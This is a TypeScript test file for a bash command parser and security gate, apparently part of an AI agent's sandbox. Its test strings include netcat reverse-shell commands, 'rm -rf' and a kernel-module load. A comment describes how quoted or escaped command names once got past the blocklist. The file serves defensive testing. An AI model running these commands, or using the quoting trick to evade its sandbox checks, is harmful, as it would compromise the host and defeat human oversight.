import { describe, it } from 'node:test';
import * as assert from 'node:assert/strict';
import {
  parseBashAST,
  extractCommands,
  resolveShellWord,
} from '../src/tools/bash-parser';
import { validateBashSecurity } from '../src/tools/bash-security';

/**
 * Trustworthy-token resolution: the AST command name must be the literal
 * executable name the shell would run, with surrounding/embedded quotes removed
 * and backslash escapes resolved. Without this, a quoted/escaped spelling of an
 * AST-blocked command (`"nc"`, `'insmod'`, `r"m"`, `\rm`) parses to a command
 * token that still carries the quotes, so the `AST_BLOCKED_COMMANDS` match in
 * bash-security silently fails open — a real sandbox-escape / exfil bypass.
 * Mirrors Claude Code's ast.ts resolved-argv (quotes removed, backslash
 * unescaped) feeding the permission/security matcher.
 */
describe('resolveShellWord', () => {
  it('strips surrounding double and single quotes', () => {
    assert.equal(resolveShellWord('"nc"'), 'nc');
    assert.equal(resolveShellWord("'insmod'"), 'insmod');
  });

  it('resolves embedded quotes (shell concatenation)', () => {
    assert.equal(resolveShellWord('r"m"'), 'rm');
    assert.equal(resolveShellWord('"n"c'), 'nc');
    assert.equal(resolveShellWord("in's'mod"), 'insmod');
  });

  it('unescapes backslash escapes outside single quotes', () => {
    assert.equal(resolveShellWord('\\rm'), 'rm');
    assert.equal(resolveShellWord('n\\c'), 'nc');
  });

  it('keeps backslashes literal inside single quotes', () => {
    assert.equal(resolveShellWord("'a\\b'"), 'a\\b');
  });

  it('leaves unquoted words and variable expansions untouched', () => {
    assert.equal(resolveShellWord('grep'), 'grep');
    assert.equal(resolveShellWord('$FOO'), '$FOO');
  });
});

describe('parseBashAST resolves quoted/escaped command names', () => {
  const cases: Array<[string, string]> = [
    ['"nc" -e /bin/sh 1.2.3.4', 'nc'],
    ["'insmod' mod.ko", 'insmod'],
    ['r"m" -rf /tmp/x', 'rm'],
    ['\\rm -rf /tmp/x', 'rm'],
  ];
  for (const [input, expected] of cases) {
    it(`resolves ${JSON.stringify(input)} -> ${expected}`, () => {
      const ast = parseBashAST(input);
      assert.ok(ast && typeof ast !== 'symbol');
      assert.deepEqual(extractCommands(ast as never), [expected]);
    });
  }

  it('resolves a quoted command hidden behind a control-flow keyword', () => {
    const ast = parseBashAST('if x; then "insmod" evil; fi');
    assert.ok(ast && typeof ast !== 'symbol');
    assert.ok(extractCommands(ast as never).includes('insmod'));
  });
});

describe('quoted AST-blocked command is no longer a security bypass', () => {
  // End-to-end through the real security gate (the AST command matcher is the
  // consumer). The unquoted form is already blocked; the quoted/escaped forms
  // must be blocked identically now.
  it('blocks quoted netcat reverse shell', () => {
    assert.equal(validateBashSecurity('nc -e /bin/sh 1.2.3.4 4444').safe, false);
    assert.equal(validateBashSecurity('"nc" -e /bin/sh 1.2.3.4 4444').safe, false);
    assert.equal(validateBashSecurity("'nc' -e /bin/sh 1.2.3.4 4444").safe, false);
  });

  it('blocks quoted kernel-module load', () => {
    assert.equal(validateBashSecurity("'insmod' /tmp/evil.ko").safe, false);
    assert.equal(validateBashSecurity('ins"mod" /tmp/evil.ko').safe, false);
  });

  it('still allows a benign quoted command (no over-block regression)', () => {
    assert.equal(validateBashSecurity('"grep" foo file.txt').safe, true);
    assert.equal(validateBashSecurity('echo "hi there"').safe, true);
  });
});
